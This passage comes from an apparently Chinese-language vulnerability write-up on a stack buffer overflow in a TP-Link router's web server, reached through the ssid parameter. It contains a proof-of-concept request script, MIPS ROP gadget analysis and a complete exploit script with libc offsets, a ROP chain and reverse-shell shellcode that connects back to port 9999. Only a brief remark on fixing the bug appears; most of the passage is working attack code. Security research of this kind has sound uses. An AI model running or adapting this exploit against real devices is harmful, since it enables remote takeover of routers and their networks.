        writePageParamSet(param_1,"%d,",&uStack3420,2);
        writePageParamSet(param_1,"%d,",&uStack3416,3);
        writePageParamSet(param_1,"%d,",&uStack3412,4);
        writePageParamSet(param_1,"%d,",&uStack3408,5);
        writePageParamSet(param_1,"%d,",&uStack3404,6);
        writePageParamSet(param_1,"%d,",&uStack3400,7);
        writePageParamSet(param_1,"%d,",&iStack3396,8);
        httpPrintf(param_1,"0,0 );\n\n");
        httpPrintf(param_1,"");
        if ((auStack3600[0] `，也验证了我们之前的代码审计，writePageParamSet是将输入的数据写入Javascript的Param对象中。同时也通过1位字节换4位字节的方式写入超出界限的数据，如果要修补这个漏洞也很简单，只需要将缓冲区扩大四倍就行了，或者修改stringModify，让产生``的时候指针size+4而不是size+1。
经过计算payload每一位应为 **0x55*”/%0A”+2+s0+s1+s2+ra**
在溢出区域出放置地址我们就能够成功控制程序流。让我们用python实现一下poc.py
    import requests
    import socket
    import socks
    import urllib
    default_socket = socket.socket
    socket.socket = socks.socksocket
    session = requests.Session()
    session.verify = False
    def exp(path,cookie):
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Cookie":"Authorization=Basic{cookie}".format(cookie=str(cookie))}
        payload="/%0A"*0x55 + "abcdefghijklmn"+"\x78\x56\x34\x12"
        params = {
            "mode":"1000",
                    "curRegion":"1000",
                    "chanWidth":"100",
                    "channel":"1000",
                    "ssid":urllib.request.unquote(payload) #if python3
                                          #urllib.unquote(payload) #if python2 (suggest)
            }
        url="http://10.211.55.8:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm".format(path=str(path))
        resp = session.get(url,params=params,headers=headers,timeout=10)
        print (resp.text)
    exp("AYEUYUFAXVOKELRC","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
###  漏洞利用
接下来让我们为这个漏洞编写一下利用脚本，语言我们使用python2.7。
利用时要注意Mips架构下默认ASLR是不开启的，并且heap和sgack是可执行的，所以直接跳转到shellcode即可。不过由于缓存不一致性，我们需要使用ROP。
> 注意Mips是大端的，数据存放方式与小端是相反的。并且在gdb调试后后记得endian为big，否则断点是断不下来的。
**构造ROP链**
Mips指令集包含一种的 **[cache incoherency(缓存不一致性)](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm)**
，指令Cache和数据Cache两者的同步需要一个时间来同步。需要调用Sleep来让shellcode从数据Cache刷新到指令Cache，否则会执行失败，不能像x86架构下直接跳转到shellcode，而是需要构造如下一条ROP链接，先调用sleep，然后在跳转到shellcode。
     sleep(1) -> read_value_from_stack -> jump to stack(shellcode)
Mips的栈并没有pop和push，而是直接调用栈，ROP链构造和x86有一些区别，不过总体上逻辑应该是更加简单了，不过gadgets比较难找（因为全是寄存器操作）。
注意的是，pwntools需要专门设置为大端，否则默认小端。
    context.endian = 'big'
**寻找gadgets**
经过上文的分析，我们知道我们能够布置栈，来控制s0～s2和ra寄存器。初始我们将ra覆盖为gadget1，用于修改寄存器$a0，将sleep函数的地址放在s2备用，将gadgets放在s1用于下一次跳转。另外，使用gadgets需要考虑流水线效应。
Gadget1，修改寄存器$a0（作为调用sleep的参数）
    LOAD:0000E204                 move    $t9, $s1
    LOAD:0000E208                 jalr    $t9 ; sysconf
    LOAD:0000E20C                 li      $a0, 3
Gadget2，完成两个功能，1.调用sleep函数，2.跳转到下一个gadgets。首先调用sleep函数（之前存放在s2中），并且结束之后sp会增加0x28字节。在结束之前也会修改ra等寄存器的值，不过这里需要注意的是0x28+var_10($sp)的意思是sp+0x28-0x10地址。（Mips是通过偏移来获得栈内参数的），这里也要先设置好ra的值。调用sleep之后，程序会跳转到ra指向的地址。
    LOAD:00037470                 move    $t9, $s2
    LOAD:00037474                 lw      $ra, 0x28+var_4($sp)
    LOAD:00037478                 lw      $s2, 0x28+var_8($sp)
    LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)
    LOAD:00037480                 lw      $s0, 0x28+var_10($sp)
    LOAD:00037484
    LOAD:00037484 loc_37484:                               # DATA XREF: xdr_callhdr↓o
    LOAD:00037484                 jr      $t9 ; xdr_opaque_auth
    LOAD:00037488                 addiu   $sp, 0x28
    #其实这段代码用gdb的反汇编看起来反而更加易懂一些
    => 0x77f70470:    move    t9,s2
       0x77f70474:    lw    ra,36(sp)
       0x77f70478:    lw    s2,32(sp)
       0x77f7047c:    lw    s1,28(sp)
       0x77f70480:    lw    s0,24(sp)
       0x77f70484:    jr    t9
       0x77f70488:    addiu    sp,sp,40
Gadget3，用于将栈底地址写入a1，即我们布置的shellcode的地址。
    LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150
    LOAD:0000E908                 move    $t9, $s1
    LOAD:0000E90C                 jalr    $t9 ; stat64
    LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)
Gadget4，跳转到shellcode
    LOAD:000374D8                 move    $t9, $a1
    LOAD:000374DC                 sw      $v0, 0x4C($a0)
    LOAD:000374E0                 move    $a1, $a2
    LOAD:000374E4                 jr      $t9
    LOAD:000374E8                 addiu   $a0, 0x4C  # 'L'
**shellcode(连接本地9999端口)**
因为我们的数据\c3会被转义，一种方式是指令替换，另一种方式是指令逃逸。这里直接参考了师傅们的shellcode[参考地址](http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA)。
**Exploit**
布置好gadgets和shellcode，最后shellcode的内容是反弹到本地的9999端口，挂好httpd服务，获取目录地址和cookie作为exp的参数运行，利用成功只需在本地用nc连接一下即可。
**EXP.py**
    #!/usr/bin/python
    from pwn import *
    import requests
    import socket
    import socks
    import urllib
    import struct
    default_socket = socket.socket
    socket.socket = socks.socksocket
    session = requests.Session()
    session.verify = False
    context.endian = 'big' 
    libc_base=0x77f39000 
    sleep =0x53CA0 #end 00053ECC
    #gadgets
    g1=0x000E204 #0x77F47204
    #LOAD:0000E204                 move    $t9, $s1
    #LOAD:0000E208                 jalr    $t9 ; sysconf
    #LOAD:0000E20C                 li      $a0, 3
    g2=0x00037470
    #LOAD:00037470                 move    $t9, $s2
    #LOAD:00037474                 lw      $ra, 0x28+var_4($sp)
    #LOAD:00037478                 lw      $s2, 0x28+var_8($sp)
    #LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)
    #LOAD:00037480                 lw      $s0, 0x28+var_10($sp)
    #LOAD:00037484
    #LOAD:00037484 loc_37484:
    #LOAD:00037484                 jr      $t9 ; xdr_opaque_auth
    #LOAD:00037488                 addiu   $sp, 0x28
    g3=0x0000E904 #0x77f47904
    #LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150
    #LOAD:0000E908                 move    $t9, $s1
    #LOAD:0000E90C                 jalr    $t9 ; stat64
    #LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)
    g4=0x00374D8
    #LOAD:000374D8                 move    $t9, $a1
    #LOAD:000374DC                 sw      $v0, 0x4C($a0)
    #LOAD:000374E0                 move    $a1, $a2
    #LOAD:000374E4                 jr      $t9
    #LOAD:000374E8                 addiu   $a0, 0x4C  # 'L'
    shellcode="\x24\x0e\xff\xfd\x01\xc0\x20\x27\x01\xc0\x28\x27\x28\x06\xff\xff"
    shellcode+="\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff"
    shellcode+="\x34\x0e\xff\xff\x01\xc0\x70\x27\xaf\xae\xff\xf6\xaf\xae\xff\xf4"
    shellcode+="\x34\x0f\xd8\xf0\x01\xe0\x78\x27\xaf\xaf\xff\xf2\x34\x0f\xff\xfd"
    shellcode+="\x01\xe0\x78\x27\xaf\xaf\xff\xf0\x27\xa5\xff\xf2\x24\x0f\xff\xef"
    shellcode+="\x01\xe0\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x8f\xa4\xff\xff"
    shellcode+="\x28\x05\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x2c\x05\xff\xff"
    shellcode+="\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\xff\xfd\x01\xc0\x28\x27"
    shellcode+="\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\x3d\x28\xaf\xae\xff\xe2"
    shellcode+="\x24\x0e\x77\xf9\xaf\xae\xff\xe0\x8f\xa4\xff\xe2\x28\x05\xff\xff"
    shellcode+="\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"
    s0=p32(0x11111111)
    s1=p32(g2+libc_base) # break 
    s2=p32(sleep+libc_base)
    payload= "/%0A"*0x55 +2*'x'+s0 +s1 +s2
    payload+=p32(g1+libc_base)  
    payload+='x'*28
    payload+=p32(g4+libc_base) #s1
    payload+=p32(0x33333333) #s2
    payload+=p32(g3+libc_base) #ra
    payload+='x'*24
    payload+=shellcode
    def exp(path,cookie):
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Cookie":"Authorization=Basic{cookie}".format(cookie=str(cookie))}
        params = {
            "mode":"1000",
                    "curRegion":"1000",
                    "chanWidth":"100",
                    "channel":"1000",
                    "ssid":urllib.unquote(payload)
            }
        url="http://10.211.55.8:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm".format(path=str(path))
        resp = session.get(url,params=params,headers=headers,timeout=10)
        print (resp.text)
    exp("FMHSNOEAAJAKZBNA","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
## 参考
[Linux系统调用Hook姿势总结](https://blog.csdn.net/tianxuhong/article/details/50974400)